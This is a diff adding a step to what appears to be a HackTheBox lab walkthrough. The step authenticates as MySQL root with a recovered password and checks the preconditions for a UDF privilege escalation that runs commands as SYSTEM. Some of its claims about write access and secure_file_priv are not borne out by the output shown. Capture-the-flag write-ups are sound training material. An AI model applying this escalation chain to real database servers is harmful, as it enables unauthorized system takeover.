@@ -844,6 +844,47 @@ C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airway
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 4.6 Authenticate as MySQL root and confirm UDF preconditions (Privilege Escalation)
+
+**Why this step:** Validate the recovered credential (4.5) and read the server settings that determine how the UDF attack must be staged.
+
+**Command:**
+
+```
+C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT user(); SELECT @@version, @@plugin_dir, @@secure_file_priv;"
+```
+
+**Breakdown:**
+
+|Component|Meaning|
+|---|---|
+|`mysql.exe -u root -p"..."`|Connect as root with the recovered password (quoted for the shell).|
+|`-e "..."`|Run the given SQL non-interactively.|
+|`SELECT user()`|Confirm the authenticated MySQL account.|
+|`@@plugin_dir`|The directory MySQL loads UDF libraries from.|
+|`@@secure_file_priv`|Restriction on `INTO OUTFILE`; irrelevant to UDF loading.|
+
+**Result:**
+
+```
+user()
+root@localhost
+@@version  @@plugin_dir             @@secure_file_priv
+8.0.42     C:\MySQL\lib\plugin\      NULL
+```
+
+**What this gives you:** Confirmed MySQL root access on a 64-bit 8.0.42 server. **Key finding:** `@@plugin_dir` is the writable `C:\MySQL\lib\plugin\`, and `@@secure_file_priv = NULL` does not block UDF loading (it only affects `OUTFILE`). A 64-bit UDF DLL placed in the plugin dir can be registered and executed as SYSTEM.
+
+**Next:** Stage a 64-bit `lib_mysqludf_sys` DLL, upload it to the plugin directory, and register `sys_eval` to run commands as SYSTEM.
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
